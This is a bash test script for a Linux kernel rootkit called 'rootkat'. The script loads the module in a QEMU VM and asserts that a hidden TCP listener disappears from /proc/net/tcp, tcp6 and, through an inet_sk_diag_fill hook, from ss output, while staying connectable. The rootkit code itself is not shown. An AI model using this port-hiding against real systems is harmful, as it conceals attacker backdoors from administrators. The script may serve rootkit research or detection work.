#!/usr/bin/env bash
# Asserts: a TCP listener whose port is added to rootkat's hidden-ports
# list disappears from BOTH surfaces — /proc/net/tcp{,6} (seq_file path,
# read by lsof / older netstat) AND the NETLINK_SOCK_DIAG path used by
# modern `ss`. The latter goes through inet_sk_diag_fill which we hook
# separately.
set -u
cd /root/rootkat
. tests/qemu/lib.sh

PORT=12345

# Clear the kernel ring buffer up front so the dmesg dump at the end
# only contains messages from module load / test execution. By default
# the cloud-init + systemd boot fills the 128KB buffer and rotates our
# module's init prints out before the test reaches the dmesg check.
dmesg -c >/dev/null 2>&1 || true

# /proc/net/tcp lists local ports as hex in column 2 (LADDR:LPORT).
# This filter extracts the LPORT column from every data row and prints
# it as decimal, one per line.
tcp_ports() {
	awk 'NR>1{split($2,a,":"); printf "%d\n", strtonum("0x" a[2])}' /proc/net/tcp
}

assert_zero "module loads" insmod lkm/rootkat.ko

# --- Baseline: a non-hiding listener appears in /proc/net/tcp ----------
exec 3< <(tests/qemu/net_helper $PORT)
read -r LINE <&3   # waits for "ready"
BASELINE_PID=$!
sleep 0.2
assert_zero "baseline: /proc/net/tcp has port" \
	bash -c "$(declare -f tcp_ports); tcp_ports | grep -qx $PORT"
kill $BASELINE_PID 2>/dev/null || true
wait $BASELINE_PID 2>/dev/null || true
exec 3<&-
sleep 0.3   # let TIME_WAIT settle so the rebind on the same port works

# --- Hide-mode listener: invisible to /proc/net/tcp readers ------------
exec 3< <(tests/qemu/net_helper $PORT hide)
read -r LINE <&3   # "ready" arrives only after the hide kill() returns
HIDE_PID=$!
sleep 0.2

assert_nonzero "hidden: /proc/net/tcp omits port"  \
	bash -c "$(declare -f tcp_ports); tcp_ports | grep -qx $PORT"

# Direct connect must still work — we hide from enumeration, not access.
assert_zero "hidden: still connectable" \
	bash -c "exec 4<>/dev/tcp/127.0.0.1/$PORT && exec 4<&- 4>&-"

# Netlink path: ss uses NETLINK_SOCK_DIAG → inet_sk_diag_fill which we
# also try to hook. The symbol may be inlined on some kernels — if so,
# the install logged a warning and ss still works as a detection vector.
# Treat as a soft expectation rather than a hard assertion.
if grep -q '^rootkat_hook_inet_sk_diag_fill_install\b' /proc/kallsyms 2>/dev/null \
   && ! ss -tln 2>/dev/null | grep -q ":$PORT "; then
	echo "PASS: hidden via netlink (ss filtered)"
	ROOTKAT_PASS=$((ROOTKAT_PASS+1))
else
	echo "INFO: ss may still show port (netlink hook may not have installed)"
	echo "--- dmesg (rootkat lines) ---"
	dmesg | grep -i rootkat | tail -40 || true
	echo "--- inet_diag module loaded? ---"
	lsmod | grep -E '^(inet_diag|tcp_diag|udp_diag)' || echo "(not loaded)"
	echo "--- inet_sk_diag_fill in kallsyms? ---"
	grep -E '\binet_sk_diag_fill\b' /proc/kallsyms | head -3 || echo "(not in kallsyms)"
	echo "--- ftrace enabled_functions matching diag_fill ---"
	grep -E 'inet_sk_diag_fill|inet_csk_diag' \
	    /sys/kernel/debug/tracing/enabled_functions 2>/dev/null \
	    | head -5 || echo "(none)"
	echo "--- ss output for port (proves it shows up) ---"
	ss -tln 2>&1 | grep -E "(:$PORT|State.*Recv-Q)" | head -5
fi

kill $HIDE_PID 2>/dev/null || true
wait $HIDE_PID 2>/dev/null || true
exec 3<&-

assert_zero "module unloads" rmmod rootkat

# --- Post-unload: visibility restored -----------------------------------
sleep 0.3
exec 3< <(tests/qemu/net_helper $PORT)
read -r LINE <&3
POST_PID=$!
sleep 0.2
assert_zero "post-unload: /proc/net/tcp shows port" \
	bash -c "$(declare -f tcp_ports); tcp_ports | grep -qx $PORT"
kill $POST_PID 2>/dev/null || true
wait $POST_PID 2>/dev/null || true
exec 3<&-


# --- IPv6: same machinery, different seq_show target -------------------
V6_PORT=12346
tcp6_ports() {
	awk 'NR>1{split($2,a,":"); printf "%d\n", strtonum("0x" a[length(a)])}' /proc/net/tcp6
}

assert_zero "v6: module loads"           insmod lkm/rootkat.ko

exec 3< <(tests/qemu/net_helper $V6_PORT v6)
read -r LINE <&3
V6_BASE_PID=$!
sleep 0.2
assert_zero "v6 baseline: tcp6 has port" \
	bash -c "$(declare -f tcp6_ports); tcp6_ports | grep -qx $V6_PORT"
kill $V6_BASE_PID 2>/dev/null || true
wait $V6_BASE_PID 2>/dev/null || true
exec 3<&-
sleep 0.3

exec 3< <(tests/qemu/net_helper $V6_PORT hide v6)
read -r LINE <&3
V6_HIDE_PID=$!
sleep 0.2
assert_nonzero "v6 hidden: tcp6 omits port" \
	bash -c "$(declare -f tcp6_ports); tcp6_ports | grep -qx $V6_PORT"
kill $V6_HIDE_PID 2>/dev/null || true
wait $V6_HIDE_PID 2>/dev/null || true
exec 3<&-

assert_zero "v6: module unloads" rmmod rootkat

report
